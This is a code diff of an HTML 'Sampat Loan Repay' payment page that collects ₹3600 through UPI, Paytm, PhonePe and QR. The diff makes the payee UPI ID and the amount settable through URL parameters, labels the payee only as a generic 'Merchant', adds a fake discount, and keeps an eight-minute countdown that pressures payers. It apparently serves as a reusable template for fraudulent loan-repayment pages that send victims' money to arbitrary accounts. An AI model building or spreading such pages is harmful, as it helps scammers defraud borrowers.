@@ -5,50 +5,15 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Sampat Loan Repay</title>
   <style>
-    * {
-      box-sizing: border-box;
-    }
-    body {
-      font-family: Arial, sans-serif;
-      background: #f7f7f7;
-      margin: 0;
-      padding: 10px;
-    }
-    .container {
-      max-width: 480px;
-      width: 100%;
-      margin: 10px auto;
-      background: #fff;
-      padding: 15px;
-      border-radius: 10px;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
-    }
-    .header { 
-      display: flex; 
-      align-items: center; 
-      justify-content: space-between; 
-      flex-wrap: wrap;
-      gap: 10px;
-    }
+    * { box-sizing: border-box; }
+    body { font-family: Arial, sans-serif; background: #f7f7f7; margin: 0; padding: 10px; }
+    .container { max-width: 480px; width: 100%; margin: 10px auto; background: #fff; padding: 15px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+    .header { display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 10px; }
     .header img { height: 35px; max-width: 100%; object-fit: contain; }
     .timer { color: red; font-weight: bold; font-size: 1.1em; }
     h2 { text-align: center; color: #0070f3; font-size: clamp(24px, 6vw, 32px); margin: 10px 0; }
     .section-title { margin: 15px 0 10px; font-weight: bold; color: #444; font-size: 0.95em; }
-    .method {
-      border: 1px solid #ddd;
-      padding: 10px 12px;
-      border-radius: 8px;
-      margin-bottom: 10px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      cursor: pointer;
-      gap: 10px;
-      text-decoration: none;
-      color: inherit;
-      background: #fff;
-      width: 100%;
-    }
+    .method { border: 1px solid #ddd; padding: 10px 12px; border-radius: 8px; margin-bottom: 10px; display: flex; align-items: center; justify-content: space-between; cursor: pointer; gap: 10px; text-decoration: none; color: inherit; background: #fff; width: 100%; }
     .method img { height: 28px; width: 28px; object-fit: contain; flex-shrink: 0; }
     .method-info { display: flex; align-items: center; gap: 10px; min-width: 0; flex: 1; text-align: left; }
     .method-info > div { overflow: hidden; text-overflow: ellipsis; }
@@ -59,58 +24,12 @@
     .reminder ol { padding-left: 20px; margin: 5px 0; }
     .reminder li { margin-bottom: 6px; }
     .highlight { color: red; font-weight: bold; }
-    /* Modal */
-    .modal {
-      display: none;
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: rgba(0,0,0,0.6);
-      justify-content: center;
-      align-items: center;
-      padding: 15px;
-      z-index: 1000;
-    }
-    .modal-content {
-      background: #fff;
-      padding: 20px;
-      border-radius: 10px;
-      max-width: 400px;
-      width: 100%;
-      text-align: center;
-      position: relative;
-      max-height: 90vh;
-      overflow-y: auto;
-    }
-    .modal-content img {
-      max-width: 100%;
-      height: auto;
-      width: 200px;
-    }
-    .close {
-      position: absolute;
-      top: 10px; right: 15px;
-      font-size: 24px;
-      cursor: pointer;
-    }
-    .utr-input {
-      width: 100%;
-      padding: 10px;
-      margin: 10px 0;
-      border: 1px solid #ccc;
-      border-radius: 6px;
-      font-size: 1em;
-    }
-    .submit-btn {
-      background: #0070f3;
-      color: white;
-      border: none;
-      padding: 10px;
-      width: 100%;
-      border-radius: 6px;
-      cursor: pointer;
-      font-size: 1em;
-    }
+    .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); justify-content: center; align-items: center; padding: 15px; z-index: 1000; }
+    .modal-content { background: #fff; padding: 20px; border-radius: 10px; max-width: 400px; width: 100%; text-align: center; position: relative; max-height: 90vh; overflow-y: auto; }
+    .modal-content img { max-width: 100%; height: auto; width: 200px; }
+    .close { position: absolute; top: 10px; right: 15px; font-size: 24px; cursor: pointer; }
+    .utr-input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 6px; font-size: 1em; }
+    .submit-btn { background: #0070f3; color: white; border: none; padding: 10px; width: 100%; border-radius: 6px; cursor: pointer; font-size: 1em; }
   </style>
 </head>
 <body>
@@ -121,20 +40,20 @@
     <div>Order will be closed in: <span class="timer" id="countdown">08:00</span></div>
   </div>
 
-  <h2>₹3600</h2>
+  <h2 id="displayAmount">₹3600</h2>
   <p style="text-align:center; color:#555; margin: 5px 0 15px; font-size: 0.9em;">The amount you need to pay</p>
 
   <div class="section-title">Method 1 (Mostly used) <span class="discount">Discounted</span></div>
   
-  <a href="paytmmp://pay?pa=arka018@axl&pn=ALOCHAYA%20DIGITAL%20PARISHEBA&mc=0000&mode=02&purpose=00&am=3600&cu=INR" class="method" onclick="openApp(event, 'paytmmp://pay?pa=arka018@axl&pn=ALOCHAYA%20DIGITAL%20PARISHEBA&mc=0000&mode=02&purpose=00&am=3600&cu=INR', 'upi://pay?pa=arka018@axl&pn=ALOCHAYA%20DIGITAL%20PARISHEBA&mc=0000&mode=02&purpose=00&am=3600&cu=INR')">
+  <a id="paytmLink" href="#" class="method">
     <div class="method-info">
       <img src="paytm.png" alt="Paytm">
-      <div><strong>Paytm</strong><small>Discounted price ₹3600</small></div>
+      <div><strong>Paytm</strong><small id="paytmDiscountText">Discounted price</small></div>
     </div>
     <img src="click here.png" alt="Click" style="height:20px; width:auto;">
   </a>
 
-  <a href="phonepe://pay?pa=arka018@axl&pn=ALOCHAYA%20DIGITAL%20PARISHEBA&mc=0000&mode=02&purpose=00&am=3600&cu=INR" class="method" onclick="openApp(event, 'phonepe://pay?pa=arka018@axl&pn=ALOCHAYA%20DIGITAL%20PARISHEBA&mc=0000&mode=02&purpose=00&am=3600&cu=INR', 'upi://pay?pa=arka018@axl&pn=ALOCHAYA%20DIGITAL%20PARISHEBA&mc=0000&mode=02&purpose=00&am=3600&cu=INR')">
+  <a id="phonepeLink" href="#" class="method">
     <div class="method-info">
       <img src="phonepe.png" alt="PhonePe">
       <div><strong>PhonePe</strong><small>Convenient and fastest</small></div>
@@ -173,7 +92,7 @@
 <div class="modal" id="qrModal">
   <div class="modal-content">
     <span class="close" onclick="closeModal('qrModal')">&times;</span>
-    <h2 style="font-size: 24px;">₹3600 <small style="color:#888; font-size: 0.7em;"><s>₹3600</s></small></h2>
+    <h2 id="modalQrAmount" style="font-size: 24px;">₹3600</h2>
     <p style="font-size: 0.9em;">Use Mobile Scan code to pay</p>
     <img src="QR.png" alt="QR Code">
     <input type="text" class="utr-input" id="utrQr" placeholder="Enter UTR (Optional)">
@@ -184,9 +103,9 @@
 <div class="modal" id="upiModal">
   <div class="modal-content">
     <span class="close" onclick="closeModal('upiModal')">&times;</span>
-    <h2 style="font-size: 24px;">₹3600</h2>
+    <h2 id="modalUpiAmount" style="font-size: 24px;">₹3600</h2>
     <p style="font-size: 0.9em;">Copy the UPI ID and pay</p>
-    <input type="text" value="arka018@axl" id="upiId" class="utr-input" readonly>
+    <input type="text" value="" id="upiId" class="utr-input" readonly>
     <button onclick="copyUPI()" class="submit-btn" style="margin-bottom: 10px;">Copy UPI ID</button>
     <input type="text" class="utr-input" id="utrUpi" placeholder="Enter UTR number">
     <button class="submit-btn" onclick="submitUTR('upi')">Submit UTR</button>
@@ -194,13 +113,37 @@
 </div>
 
 <script>
+  // Parse parameters from URL
+  const urlParams = new URLSearchParams(window.location.search);
+  const paramAmount = urlParams.get('amount') || '3600';
+  const paramUpi = urlParams.get('upi') || 'arka018@axl';
+
+  const amt = parseFloat(paramAmount);
+  const discountedAmt = (amt > 2 ? amt - 1.7 : amt).toFixed(2);
+
+  // Update DOM elements dynamically
+  document.getElementById('displayAmount').textContent = '₹' + amt;
+  document.getElementById('modalQrAmount').textContent = '₹' + discountedAmt;
+  document.getElementById('modalUpiAmount').textContent = '₹' + amt;
+  document.getElementById('paytmDiscountText').textContent = 'Discounted price ₹' + discountedAmt;
+  document.getElementById('upiId').value = paramUpi;
+
+  const paytmUrl = `paytmmp://pay?pa=${encodeURIComponent(paramUpi)}&pn=Merchant&am=${discountedAmt}&cu=INR`;
+  const phonepeUrl = `phonepe://pay?pa=${encodeURIComponent(paramUpi)}&pn=Merchant&am=${amt}&cu=INR`;
+  const fallbackUrl = `upi://pay?pa=${encodeURIComponent(paramUpi)}&pn=Merchant&am=${amt}&cu=INR`;
+
+  document.getElementById('paytmLink').setAttribute('href', paytmUrl);
+  document.getElementById('phonepeLink').setAttribute('href', phonepeUrl);
+
+  document.getElementById('paytmLink').onclick = (e) => openApp(e, paytmUrl, fallbackUrl);
+  document.getElementById('phonepeLink').onclick = (e) => openApp(e, phonepeUrl, fallbackUrl);
+
   let timeLeft = 8 * 60;
   const countdown = document.getElementById("countdown");
   function updateTimer() {
     let minutes = Math.floor(timeLeft / 60);
     let seconds = timeLeft % 60;
-    countdown.textContent = 
-      `${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
+    countdown.textContent = `${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
     if (timeLeft > 0) { timeLeft--; } else { countdown.textContent = "Expired"; }
   }
   setInterval(updateTimer, 1000);
@@ -208,17 +151,10 @@
   function openModal(id) { document.getElementById(id).style.display = "flex"; }
   function closeModal(id) { document.getElementById(id).style.display = "none"; }
 
-  // Smart App Intent Handler with Fallback
   function openApp(event, appScheme, fallbackScheme) {
     event.preventDefault();
-    
-    // Try opening the specific app scheme first
     window.location.href = appScheme;
-
-    // Fallback to standard UPI intent if specific app scheme doesn't trigger immediately
-    setTimeout(function() {
-      window.location.href = fallbackScheme;
-    }, 1500);
+    setTimeout(() => { window.location.href = fallbackScheme; }, 1500);
   }
 
   function copyUPI() {
@@ -235,7 +171,7 @@
   function submitUTR(type) {
     let utr = type === 'qr' ? document.getElementById("utrQr").value : document.getElementById("utrUpi").value;
     if (utr) {
-      alert("UTR submitted: " + utr + " (simulated)");
+      window.location.href = "https://github.com/mrinvisibleking/repaymentpro--loanclosing-payment-directly-from-server-via-manager";
     } else {
       alert("Please enter UTR before submitting.");
     }
